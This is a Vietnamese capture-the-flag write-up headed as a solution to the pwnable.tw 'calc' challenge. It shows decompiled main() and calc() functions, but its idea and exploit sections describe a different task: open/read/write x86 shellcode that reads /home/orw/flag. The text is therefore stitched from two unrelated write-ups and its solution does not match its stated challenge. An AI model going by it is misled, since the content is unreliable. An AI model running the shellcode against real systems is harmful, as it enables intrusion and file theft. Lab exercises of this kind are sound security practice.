# pwnable.tw - calc

Have you ever use Microsoft calculator?

`nc chall.pwnable.tw 10100`

# 1) Analysis and find Bug

Đầu tiên ta kiếm tra các secure flag và xem thông tin cơ bản của file.

![checksec.png](images/checksec.png)

Ta tiến hành đọc và phân tích mã nguồn chương trình bằng IDA để tìm hướng khai thác.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

Hàm main của chương trình set timeout - chương trình sẽ tự động ngắt kết nối nếu không có tác động input đầu vào nào. Sau đó là gọi tới hàm `calc()`.

```
unsigned int calc()
{
  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
  
  // canary
  unsigned int v3; // [esp+5ACh] [ebp-Ch]
  v3 = __readgsdword(0x14u);
  
  while ( 1 )
  {
    bzero(s, 0x400u);
    if ( !get_expr(s, 1024) )
      break;
    init_pool(v1);
    if ( parse_expr(s, v1) )
    {
      printf("%d\n", v1[v1[0]]);
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v3;
}
```



# 2) Idea

Ở phần hint của bài cũng đã mô tả khá rõ là ta chỉ có thể dùng shellcode `open`, `read` và `write`, khi chúng ta nhập input là shellcode thì chương trình sẽ thực hiện các công việc mà shellcode đó yêu cầu. Ở đây ta sẽ dùng `syscall_open` để mở file flag ở `/home/orw/flag` và dùng `syscall_read`, `syscall_write` để đọc và ghi flag ra `terminal`, còn về shellcode 32bit thì ta phải tự viết vì đây không phải là shellcode execute nên không phổ biến để chọn.

# 3) Exploit

Đầu tiên sẽ là shellcode `syscall_open` mở file flag ở `/home/orw/flag`. 

```asm
	xor ecx,ecx                ; clear the ecx registry
	mov eax, 0x5               ; sys_open
	push ecx                   ; push a NULL value unto the stack
	push 0x67616c66            ; galf (flag)
	push 0x2f77726f            ; /wro (orw/)
	push 0x2f656d6f            ; /emo (ome/)
	push 0x682f2f2f            ; h/// (///h)
	mov ebx, esp               ; move contents to ebx
	xor edx, edx               ; clear the edx registry
	int 0x80                   ; interrupt, call the kernel to execute the syscall
```

Tiếp theo là `syscall_read` và `syscall_write` để đọc và ghi flag.

```asm
	mov eax, 0x3               ; sys_read
	mov ecx, ebx               ; contents of the flag file
	mov ebx, 0x3               ; fd
	mov dl, 0x30               ; decimal 48, used for the interrupt
	int 0x80                   ; interrupt, call the kernel to execute the syscall

	mov eax, 0x4               ; sys_write
	mov bl, 0x1                ; decimal 1, used for the interrupt
	int 0x80                   ; interrupt, call the kernel to execute the syscall
```

Trên đây là code asm không phải là shellcode, bạn có thể dùng các hàm có sẵn trong `pwntools` để chuyển code trên thành mã shellcode. Tôi dùng tools online [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly2) để làm điều đó.

![shellcode.png](images/shellcode.png)

# 4) Source code and get Flag

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

![flag.png](images/flag.png)

------------------------------------------------------
